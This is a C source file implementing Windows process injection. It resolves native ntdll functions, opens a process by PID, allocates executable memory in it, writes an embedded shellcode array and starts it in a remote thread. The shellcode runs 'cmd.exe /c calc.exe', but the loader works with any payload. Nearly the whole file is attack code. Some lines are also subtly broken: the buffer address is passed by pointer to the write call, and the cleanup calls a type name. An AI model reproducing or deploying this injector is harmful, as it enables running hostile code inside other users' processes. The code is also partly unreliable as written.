#include <Windows.h>
#include <stdio.h>
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

/*------STRUCTURES---------*/ 

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; 
	PVOID SecurityQualityOfService; 
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;



typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;


/*----------Function Prototype---------*/

typedef NTSTATUS (NTAPI* (NtOpenProcess))(
	_Out_ PHANDLE ProcessHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PCLIENT_ID ClientId
);

typedef NTSTATUS (NTAPI* (NtAllocateVirtualMemory))(
	_In_ HANDLE ProcessHandle,
	_Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
	_In_ ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG AllocationType,
	_In_ ULONG Protect
);

typedef NTSTATUS (NTAPI* (NtWriteVirtualMemory))(
		_In_ HANDLE ProcessHandle,
		_In_opt_ PVOID BaseAddress,
		_In_reads_bytes_(BufferSize) PVOID Buffer,
		_In_ SIZE_T BufferSize,
		_Out_opt_ PSIZE_T NumberOfBytesWritten
	);

typedef NTSTATUS (NTAPI* (NtCreateThreadEx))(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PVOID StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
    );

typedef NTSTATUS (NTAPI* (NtWaitForSingleObject))(
	_In_ HANDLE Handle,
	_In_ BOOLEAN Alertable,
	_In_opt_ PLARGE_INTEGER Timeout
);

typedef NTSTATUS (NTAPI* (NtClose))(
	_In_ HANDLE Handle
);


int main(int argc, char* argv[]) {

	DWORD PID			= NULL;
	HANDLE hThread		= NULL;
	HANDLE hProcess		= NULL;
	HMODULE NtdllHandle = NULL;
	PVOID rBuffer		= NULL;
	NTSTATUS STATUS		= NULL;
	
	unsigned char shellcode[]	= {
		0xfc,0x48,0x83,0xe4,0xf0,
		0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,
		0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,
		0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,
		0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
		0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,
		0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
		0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,
		0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,
		0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,
		0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
		0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,
		0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,
		0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,
		0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,
		0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,
		0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,
		0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,
		0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,
		0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
		0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
		0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,
		0x64,0x2e,0x65,0x78,0x65,0x20,0x2f,0x63,0x20,0x63,0x61,0x6c,
		0x63,0x2e,0x65,0x78,0x65,0x00
	};
	
	SIZE_T shellsize			= sizeof(shellcode);
	

	if (argc < 2) {
		printf("Usage: %s <PID>\n", argv[0]);
		return -1;
	}

	PID = atoi(argv[1]);

	NtdllHandle = GetModuleHandleW(L"NTDLL");
	if (!NtdllHandle) {
		printf("[GetModuleHandleW] failed, error: 0x%lx", GetLastError());
		return FALSE;
	}
	printf("[0x%p] got the address of NTDLL!", NtdllHandle);
	
	OBJECT_ATTRIBUTES OA = { sizeof(OA) , NULL };
	CLIENT_ID CID = { (HANDLE)PID , NULL };

	puts("Populating Functions ...");
	/*Syntax : <Function Prototype Defined> <name> = (<FPD>)GetProcAddress(<handle> , '<function name>')*/
	NtOpenProcess NtOpenProc = (NtOpenProcess)GetProcAddress(NtdllHandle, "NtOpenProcess");
	NtAllocateVirtualMemory NtVirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(NtdllHandle, "NtAllocateVirtualMemory");
	NtWriteVirtualMemory NtWriteMem = (NtWriteVirtualMemory)GetProcAddress(NtdllHandle, "NtWriteVirtualMemory");
	NtCreateThreadEx NtCreateThread = (NtCreateThreadEx)GetProcAddress(NtdllHandle, "NtCreateThreadEx");
	NtWaitForSingleObject waitForMe = (NtWaitForSingleObject)GetProcAddress(NtdllHandle, "NtWaitForSingleObject");
	NtClose Closing = (NtClose)GetProcAddress(NtdllHandle, "NtClose");

	
	printf("Getting a handle to process  [ %ld ]\n", PID);
	//hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	STATUS = NtOpenProc(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS != STATUS_SUCCESS) {
		printf("[ %ld ]: open process failed. ERROR : %lx\n", PID, STATUS);
		return EXIT_FAILURE;
	}
	puts("Handle to process successful...\n");
	printf("Process  handle at [ 0x%lx ]", hProcess);

	//Buffer Creation
	puts("\n Allocating buffer...\n");
	STATUS = NtVirtualAlloc(hProcess, &rBuffer, 0, &shellsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	//rBuffer = NtVirtualAlloc(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	//if (!rBuffer) {
	if (STATUS != STATUS_SUCCESS) {
		printf("[ %ld ]: Memory allocation failed. ERROR : %lx\n", PID, STATUS);
		goto CLEANUP;
	}
	puts("Memory allocation successful...\n");
	printf("Memory allocated at [ 0x%lx ]", rBuffer);

	//Writing into buffer
	puts("\n Writing into buffer...");
	STATUS = NtWriteMem(hProcess, &rBuffer, shellcode, shellsize, 0);
	//WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), 0);
	puts("Writing into buffer successful...\n");

	//Remote Thread
	puts("\n Creating a Thread...");
	STATUS = NtCreateThread(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
	//hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0);
	//if (!hThread) {
	if (STATUS != STATUS_SUCCESS) {
		printf("[ %ld ]: Remote thread failed. ERROR : %lx\n", PID, STATUS);
		goto CLEANUP;
	}
	puts("Remote thread successful...\n");
	printf("Remote thread at [ 0x%lx ]\n", hThread);

	puts("Waiting for object\n");
	waitForMe(hThread, FALSE, 0);
	puts("Thread execution done.\n");
	puts("Stating the cleaning process.\n");

CLEANUP:
	if (hThread) {
		puts("Closing handle on Thread\n");
		NtClose(hThread);
	}
	if (hProcess) {
		puts("Closing handle on Process\n");
		NtClose(hProcess);
	}
	return EXIT_SUCCESS;
}